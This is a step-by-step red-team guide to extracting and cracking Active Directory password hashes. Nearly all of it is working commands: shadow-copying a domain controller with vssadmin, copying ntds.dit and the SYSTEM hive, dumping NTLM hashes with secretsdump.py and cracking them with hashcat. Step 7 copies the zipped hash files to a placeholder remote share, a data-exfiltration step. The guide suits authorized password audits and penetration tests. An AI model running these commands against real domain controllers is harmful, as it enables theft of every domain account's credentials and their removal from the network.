
# Red Team Password Extraction & Analysis Guide

This guide outlines how to extract password hashes from an Active Directory domain controller and analyze them using open-source tools. The steps assume you have **Administrator or SYSTEM-level access** on the target system.

---

## üîç Step 1: Review Existing Shadow Copies

Before creating a new shadow copy, list all current ones so they are not deleted accidentally later.

```cmd
vssadmin list shadows
```

---

## üì¶ Step 2: Create a New Shadow Copy

Use the appropriate drive letter (e.g., `C:`) depending on where the `ntds.dit` file is located.

```cmd
vssadmin create shadow /for=C:
```

Then list shadows again and **note the new Shadow Copy ID**:

```cmd
vssadmin list shadows
```

---

## üìÅ Step 3: Copy NTDS and SYSTEM Hive Files

Replace `<ShadowCopyPath>` with the full path shown in the shadow list output (e.g., `\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\`).

```cmd
copy "<ShadowCopyPath>\Windows\NTDS\ntds.dit" C:\Temp\
copy "<ShadowCopyPath>\Windows\System32\config\SYSTEM" C:\Temp\
```

Ensure you have enough disk space before copying.

---

## üîì Step 4: Extract Hashes with secretsdump

[Impacket](https://github.com/SecureAuthCorp/impacket)'s `secretsdump.py` can extract NTLM hashes using both files:

```bash
secretsdump.py -system SYSTEM -ntds ntds.dit LOCAL > ntds_hashes.txt
```

The `SYSTEM` hive provides the boot key to decrypt `ntds.dit`.

---

## üîë Step 5: Crack Hashes with Hashcat

Use [Hashcat](https://hashcat.net/hashcat/) with your favorite wordlist and ruleset (e.g., [Toxic](https://github.com/NSAKEY/toxic)):

```bash
hashcat -m 1000 ntds_hashes.txt rockyou.txt -r rules/toxic.rule --force
```

`-m 1000` is for NTLM hashes. Use `--show` later to see cracked results.

---

## üìä Step 6: Analyze with pipal and NtdsAudit

Generate stats about cracked passwords using [pipal](https://github.com/digininja/pipal):

```bash
pipal cracked_passwords.txt > password_stats.txt
```

Use [NtdsAudit](https://github.com/dionach/NtdsAudit) to audit password quality and policy issues:

```powershell
NtdsAudit.exe ntds.dit SYSTEM -p password_list.txt
```

---

## üì§ Step 7: Encrypt and Send Results Securely

Zip the `ntds.dit`, `SYSTEM`, and `ntds_hashes.txt` files with encryption. Send the password to the designated contact through a secure channel.

```cmd
net use R: \\<remote_host>\\<share> /user:<user> <password>
copy secure_data.zip R:\
net use R: /delete
```

---

## üßπ Step 8: Cleanup

Delete only the new shadow copy created in Step 2. Use the correct Shadow ID:

```cmd
vssadmin delete shadows /Shadow=<ShadowID>
```

Do not delete pre-existing shadow copies.

---

## üß† Notes

- Always test on non-production environments with authorization.
- Blank passwords should be included and identified during analysis.
- Use SID history or group membership changes to correlate cracked credentials with privilege escalation risks.

---
